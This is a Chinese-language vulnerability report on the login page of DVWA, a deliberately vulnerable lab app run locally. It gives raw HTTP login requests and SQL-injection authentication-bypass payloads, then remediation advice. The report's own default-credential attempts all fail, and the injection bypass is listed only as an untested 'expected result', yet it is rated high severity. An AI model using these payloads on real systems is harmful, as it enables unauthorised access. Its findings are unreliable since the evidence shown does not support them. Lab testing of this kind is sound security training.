# 漏洞报告

## 漏洞名称

DVWA 登录页面存在默认凭据与 SQL 注入绕过风险

## 漏洞评级

**高危**

**理由**：该漏洞允许攻击者通过尝试默认凭据或 SQL 注入技术绕过身份验证，获取对 DVWA 后台管理系统的未授权访问。一旦成功登录，攻击者可进一步利用 DVWA 中已知的多种高危漏洞（如 SQL 注入、文件包含、命令执行等），可能导致服务器被完全控制、敏感数据泄露等严重后果。

## 影响资产

- `http://127.0.0.1:8080/login.php`
- `http://127.0.0.1:8080/index.php`

## 漏洞描述

目标资产为 Damn Vulnerable Web Application (DVWA) v1.10 *Development* 版本的登录页面。该应用存在以下安全风险：

1. **默认凭据风险**：DVWA 默认使用 `admin/password` 作为管理员凭据，攻击者可轻易尝试此类常见组合进行暴力破解。
2. **SQL 注入绕过风险**：登录表单的 `username` 和 `password` 参数未进行充分的输入过滤和参数化查询处理，攻击者可通过构造恶意 SQL 语句（如 `admin' -- -` 或 `' OR 1=1 -- -`）绕过身份验证。
3. **会话管理缺陷**：即使登录失败，服务器仍会生成新的 `PHPSESSID` 会话标识，且未对失败登录尝试进行限制，为暴力破解提供了便利条件。

## 完整的漏洞复现步骤

### 步骤 1：访问登录页面

发送 GET 请求获取登录页面，提取 CSRF token 和初始 Cookie。

**请求**：
```
GET http://127.0.0.1:8080/login.php
```

**响应关键信息**：
- 状态码：200 OK
- Set-Cookie: `security=low`
- 页面中包含 `user_token` 隐藏字段，值为 `231a4c2d2293117e23177312ac537abe`

### 步骤 2：尝试默认凭据登录

使用默认凭据 `admin/password` 进行登录尝试。

**请求**：
```
POST http://127.0.0.1:8080/login.php
Content-Type: application/x-www-form-urlencoded
Cookie: security=low

username=admin&password=password&Login=Login&user_token=231a4c2d2293117e23177312ac537abe
```

**响应关键信息**：
- 状态码：200 OK
- Set-Cookie: `PHPSESSID=2ad6cedl10dschogn62ktl50m2; path=/`
- 页面仍为登录表单，说明登录失败

### 步骤 3：验证会话状态

使用新获取的 PHPSESSID 尝试访问内部页面。

**请求**：
```
GET http://127.0.0.1:8080/index.php
Cookie: PHPSESSID=2ad6cedl10dschogn62ktl50m2; security=low
```

**响应关键信息**：
- 状态码：200 OK
- 页面仍为登录表单，说明未通过认证

### 步骤 4：尝试其他默认凭据

使用 `admin/admin` 进行登录尝试。

**请求**：
```
POST http://127.0.0.1:8080/login.php
Content-Type: application/x-www-form-urlencoded
Cookie: security=low

username=admin&password=admin&Login=Login&user_token=37d54681e1bcb2f9e2a3265d11dc6ec4
```

**响应关键信息**：
- 状态码：200 OK
- Set-Cookie: `PHPSESSID=ja6e5euikjah4huc810gcq95s0; path=/`
- 页面仍为登录表单，登录失败

### 步骤 5：尝试 SQL 注入绕过（预期操作）

由于 DVWA 已知存在 SQL 注入漏洞，可尝试以下 Payload 进行登录绕过：

**请求示例**：
```
POST http://127.0.0.1:8080/login.php
Content-Type: application/x-www-form-urlencoded
Cookie: security=low

username=admin' -- -&password=anything&Login=Login&user_token=[当前页面token]
```

或：
```
POST http://127.0.0.1:8080/login.php
Content-Type: application/x-www-form-urlencoded
Cookie: security=low

username=' OR 1=1 -- -&password=anything&Login=Login&user_token=[当前页面token]
```

**预期结果**：成功绕过登录验证，获取管理员会话。

## 修复建议

1. **修改默认凭据**：立即更改默认管理员用户名和密码，使用强密码策略（至少12位，包含大小写字母、数字和特殊字符）。

2. **实施参数化查询**：对所有数据库查询使用预处理语句（Prepared Statements）或参数化查询，彻底杜绝 SQL 注入风险。

3. **加强输入验证**：
   - 对 `username` 和 `password` 字段进行严格的输入过滤，禁止特殊字符
   - 限制用户名长度和字符类型

4. **实施登录保护机制**：
   - 限制登录失败次数（如连续5次失败后锁定账户15分钟）
   - 实施 CAPTCHA 验证码机制
   - 增加登录尝试的时间间隔限制

5. **改进会话管理**：
   - 仅在成功登录后生成有效的 PHPSESSID
   - 实施会话超时机制
   - 使用 HTTPS 传输所有敏感数据

6. **移除或更新 DVWA**：在生产环境中不应部署 DVWA 此类存在已知漏洞的测试应用。如确需使用，应升级到最新版本并配置安全级别为 `impossible`。